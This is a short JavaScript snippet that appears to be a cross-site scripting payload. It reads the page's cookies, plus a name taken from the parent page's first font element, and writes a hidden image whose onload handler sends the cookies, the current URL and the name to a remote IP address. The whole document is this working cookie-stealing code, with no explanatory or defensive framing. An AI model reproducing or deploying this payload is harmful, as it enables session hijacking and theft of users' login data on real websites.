var cookie = encodeURIComponent(document.cookie);
var name = encodeURIComponent(parent.document.getElementsByTagName("font")[0].innerText);

document.write('<img src="https://cravefood2017.github.io/t.png" style="display:none;" onload=this.src="http://52.220.154.212/no.php?C=' + cookie + '&D=' + window.location.href+'&N='+name + '">');
console.log('<img src="https://cravefood2017.github.io/t.png" style="display:none;" onload=this.src="http://52.220.154.212/no.php?C=' + cookie + '&D=' + window.location.href+'&N='+name + '">');
